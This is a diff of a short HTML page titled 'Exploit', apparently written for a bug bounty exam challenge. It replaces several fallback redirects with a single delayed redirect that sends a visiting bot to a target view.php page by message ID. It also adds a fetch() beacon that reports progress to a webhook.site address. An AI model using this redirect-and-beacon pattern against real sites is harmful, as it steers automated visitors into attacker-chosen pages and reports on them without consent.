@@ -1,31 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting</title>
-</head>
+<head><title>Exploit</title></head>
 <body>
+    <h1 id="status">Initiating Redirect...</h1>
     <script>
-        // Use the ID from your latest successful API submission
-        const id = "69e2a59cbee6d6b7c6629efb";
-        const target = "https://bugbounty-exam.hashacademy.co/view.php?id=" + id;
+        // 1. YOUR NEW ID GOES HERE
+        const messageId = "69e2a59cbee6d6b7c6629efb"; 
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/view.php?id=" + messageId;
 
-        // Try three different ways to force the bot to move domains
-        console.log("Redirecting...");
-        
-        // 1. Standard replace
-        window.location.replace(target);
+        // Log the attempt to YOUR webhook so you know the redirect STARTED
+        fetch("https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?status=redirecting_to_" + messageId);
 
-        // 2. Fallback if replace is blocked
+        // Perform the redirect
         setTimeout(() => {
-            window.location.href = target;
-        }, 500);
-
-        // 3. Last resort: Meta Refresh
-        setTimeout(() => {
-            const meta = document.createElement('meta');
-            meta.httpEquiv = "refresh";
-            meta.content = "0;url=" + target;
-            document.getElementsByTagName('head')[0].appendChild(meta);
+            window.location.replace(targetUrl);
         }, 1000);
     </script>
 </body>
